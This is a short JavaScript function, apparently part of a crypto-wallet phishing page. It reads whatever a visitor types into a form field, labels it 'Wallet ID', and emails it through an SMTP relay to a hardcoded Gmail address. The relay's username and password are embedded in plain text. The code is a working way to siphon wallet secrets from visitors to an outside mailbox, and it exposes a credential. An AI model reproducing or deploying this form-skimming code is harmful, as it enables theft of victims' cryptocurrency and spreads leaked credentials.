function emailSend(){

  var message = document.getElementById('message').value;

  var messageBody = "Wallet ID: " + message;

  Email.send({
  Host : "smtp.elasticemail.com",
  Username : "itodouchenna57@gmail.com",
  Password : "9326BB0E70BE88D6A7806866DD80BF5727ED",
  To : 'itodouchenna57@gmail.com',
  From : "itodouchenna57@gmail.com",
    Subject : "Walleth",
    Body : messageBody
}).then(
  message => alert(message)
);
}